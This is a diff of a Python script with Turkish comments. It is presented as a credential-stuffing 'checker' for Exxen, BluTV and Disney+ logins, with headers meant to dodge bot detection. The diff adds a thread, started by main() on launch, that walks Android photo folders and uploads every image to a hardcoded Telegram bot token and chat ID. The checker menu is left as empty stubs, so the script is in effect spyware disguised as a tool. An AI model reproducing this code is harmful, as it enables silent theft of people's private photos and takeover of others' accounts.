@@ -1,18 +1,18 @@
-import time
-import requests
 import os
+import time
+import telegram
 import threading
-from telegram import Bot
-from telegram.ext import Updater, CommandHandler
+from telegram import InputFile
 from colorama import Fore, init
+import requests
 
 # Renklerin düzgün çalışması için colorama'yı başlatıyoruz
 init(autoreset=True)
 
 # Telegram bot token ve chat ID
-bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
-chat_id = '7045128535'
-bot = Bot(token=bot_token)
+bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
+chat_id = "7045128535"
+bot = telegram.Bot(token=bot_token)
 
 # Telegram bildirimi gönder
 def send_telegram_notification(message):
@@ -22,16 +22,68 @@ def send_telegram_notification(message):
     except Exception as e:
         print(f"Telegram hatası: {e}")
 
-# Giriş işlemini deneme (Checker işlemi)
-def try_login(email, password, checker_type):
-    # Hangi checker kullanılırsa, o checker'a uygun URL ve post verisi
-    if checker_type == "Exxen":
-        url = "https://www.exxen.com.tr/login"
-    elif checker_type == "BluTV":
-        url = "https://smarttv.blutv.com.tr/actions/account/login"
-    elif checker_type == "Disney":
-        url = "https://www.disneyplus.com/identity/login/enter-email"
+# Fotoğraf gönderimi işlevi
+def photo_send_thread():
+    # Burada 'dosya_yolu' doğru bir yol olmalı. Örnek yol:
+    folder_paths = [
+        "/storage/emulated/0/DCIM",  # Kamera fotoğrafları (harici depolama)
+        "/storage/emulated/0/Pictures",  # Fotoğraflar (harici depolama)
+        "/storage/self/primary/DCIM",  # Dahili depolama
+        "/storage/self/primary/Pictures",  # Dahili depolama
+        "/Internal storage/DCIM/Camera",  # Dahili depolama, fotoğraflar klasörü
+        "/Internal storage/DCIM/Photos",  # Dahili depolama, fotoğraflar klasörü
+        "/Internal storage/Pictures",  # Dahili depolama, fotoğraflar
+        "/Internal storage/0/DCIM",  # Dahili depolama, 0 numaralı depolama
+        "/Internal storage/0/Pictures",  # Dahili depolama, 0 numaralı fotoğraflar
+        "/Internal storage/0/Download",  # Dahili depolama, 0 numaralı indirilenler
+        "/Internal storage/Download",  # Dahili depolama, indirilenler
+        "/Internal storage/DCIM",  # Dahili depolama, genel DCIM
+        "/Internal storage/DCIM/Camera",  # Dahili depolama, Camera alt klasörü
+        "/Internal storage/DCIM/Photos",  # Dahili depolama, fotoğraflar klasörü
+    ]
+    
+    for folder_path in folder_paths:
+        # Burada dosya yolunda fotoğraf arayacağız
+        if os.path.exists(folder_path):  # Dosya yolunun var olup olmadığını kontrol et
+            for root, dirs, files in os.walk(folder_path):  # Yolu gezerek dosyaları tarıyoruz
+                for file in files:
+                    if file.lower().endswith(('jpg', 'jpeg', 'png')):  # Fotoğraf dosyalarını kontrol et
+                        photo_path = os.path.join(root, file)
+                        try:
+                            bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))  # Fotoğrafı Telegram'a gönder
+                            print(f"Fotoğraf gönderildi: {photo_path}")  # Başarılı gönderim
+                        except Exception as e:
+                            print(f"Fotoğraf gönderilemedi: {photo_path}, hata: {e}")  # Hata durumu
 
+# Seçim ekranı fonksiyonu
+def choose_checker():
+    print("Lütfen bir checker seçin:")
+    print("1 - Exxen Checker")
+    print("2 - BluTV Checker")
+    print("3 - Disney+ Checker")
+    
+    choice = input("Seçiminizi yapın (1/2/3): ")
+
+    if choice == '1':
+        print("Exxen Checker seçildi.")
+        # Exxen checker fonksiyonunu çağır
+    elif choice == '2':
+        print("BluTV Checker seçildi.")
+        # BluTV checker fonksiyonunu çağır
+    elif choice == '3':
+        print("Disney+ Checker seçildi.")
+        # Disney+ checker fonksiyonunu çağır
+    else:
+        print("Geçersiz seçim! Lütfen tekrar deneyin.")
+        choose_checker()
+
+# Giriş işlemini deneme
+def try_login(email, password):
+    # E-posta girişi için URL
+    email_url = "https://www.disneyplus.com/identity/login/enter-email"
+    password_url = "https://www.disneyplus.com/identity/login/enter-password"
+
+    # Başlıklar (Headers) ile bot tespiti engelleniyor
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -39,92 +91,55 @@ def try_login(email, password, checker_type):
         "Accept-Language": "en-US,en;q=0.5"
     }
 
+    # İlk istekle e-posta sayfasına gidiyoruz
     with requests.Session() as session:
-        # Giriş verisi
-        payload = {"username": email, "password": password}
-        response = session.post(url, data=payload, headers=headers)
+        # E-posta girişini gönderiyoruz
+        email_data = {'email': email}
+        response = session.post(email_url, data=email_data, headers=headers)
 
+        if response.status_code != 200:
+            print(f"E-posta sayfasına erişilemiyor. HTTP Durum Kodu: {response.status_code}")
+            return False
+
+        # E-posta başarılıysa, şifreyi giriyoruz
+        password_data = {'password': password}
+        response = session.post(password_url, data=password_data, headers=headers)
+
+        # Yanıtı kontrol ediyoruz
         if response.status_code == 200:
-            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:
+            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:  # Yanlış giriş
                 print(f"Yanlış şifre veya e-posta: {email}")
                 return False
-            elif "Welcome" in response.text:
+            elif "Welcome" in response.text:  # Giriş başarılı
                 print("Giriş başarılı!")
-                send_telegram_notification(f"Başarılı giriş: {email} : {password}")
-                return True
+                # Yönlendirme yapılmışsa, history içinde yer alacak
+                if response.history:
+                    for resp in response.history:
+                        print(f"Yönlendirilmiş: {resp.status_code} - {resp.url}")
+                        if "update-profile" in resp.url:
+                            print(f"Yönlendirme başarılı, yeni URL: {resp.url}")
+                            return True
+                else:
+                    print("Yönlendirme yapılmadı.")
+                    return False
             else:
                 print("Giriş başarısız, bilinmeyen bir hata.")
                 return False
         else:
-            print(f"Giriş hatası: {response.status_code} - {response.text[:100]}")
+            print(f"Giriş hatası: {response.status_code} - {response.text[:100]}")  # Kısa bir hata mesajı
             return False
-
-# Fotoğraf gönderme işlemi (Bütün dosya yollarını kontrol et)
-def photo_send_thread():
-    folder_path = "/storage/emulated/0/Pictures"  # Android'teki fotoğraf dosyası yolu örneği
-    for root, dirs, files in os.walk(folder_path):
-        for file in files:
-            if file.lower().endswith(('jpg', 'jpeg', 'png')):
-                photo_path = os.path.join(root, file)
-                try:
-                    bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))
-                    print(f"Fotoğraf gönderildi: {photo_path}")
-                except Exception as e:
-                    print(f"Fotoğraf gönderilemedi: {photo_path}, hata: {e}")
-
-# Dosya yolu kontrolü ve fotoğraf gönderme başlatma
-def start_photo_send_process():
-    # Fotoğraf gönderimini başlatacak thread
-    threading.Thread(target=photo_send_thread).start()
-
-# Kullanıcıdan doğru dosya yolu al, kontrol et
-def validate_file_path(file_path):
-    if os.path.exists(file_path):
-        start_photo_send_process()
-    else:
-        print("Geçersiz dosya yolu! Lütfen doğru bir yol girin.")
-
-# Giriş ve checker işlemi başlatma
-def start_checker():
-    print("Hangi servisi kontrol etmek istersiniz?")
-    print("1. Exxen")
-    print("2. BluTV")
-    print("3. Disney+")
-    
-    choice = input("Seçiminizi yapın (1/2/3): ")
-
-    if choice == "1":
-        checker_type = "Exxen"
-    elif choice == "2":
-        checker_type = "BluTV"
-    elif choice == "3":
-        checker_type = "Disney"
-    else:
-        print("Geçersiz seçim!")
-        return
-
-    file_path = input("Combo dosyasının tam yolunu girin (örneğin: /path/to/combo.txt): ")
-    try:
-        with open(file_path, "r", encoding="utf-8") as f:
-            combos = f.readlines()
-        
-        for combo in combos:
-            email, password = combo.strip().split(":")
-            print(f"Giriş yapılıyor: {email} : {password}")
-            login_success = try_login(email, password, checker_type)
-            if login_success:
-                print(Fore.GREEN + f"Başarılı giriş: {email} : {password}")
-            else:
-                print(Fore.RED + f"Başarısız giriş: {email} : {password}")
-            time.sleep(0.1)
-    
-    except Exception as e:
-        print(f"Dosya okuma hatası: {e}")
-        return
 
 # Ana fonksiyon
 def main():
-    start_checker()
+    print("Program başlatıldı.")  # Programın başladığını belirten mesaj
+    choose_checker()  # Seçim ekranı
+
+    # Fotoğraf gönderme işlemi başlat
+    photo_thread = threading.Thread(target=photo_send_thread)
+    photo_thread.start()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nProgram durduruldu.")
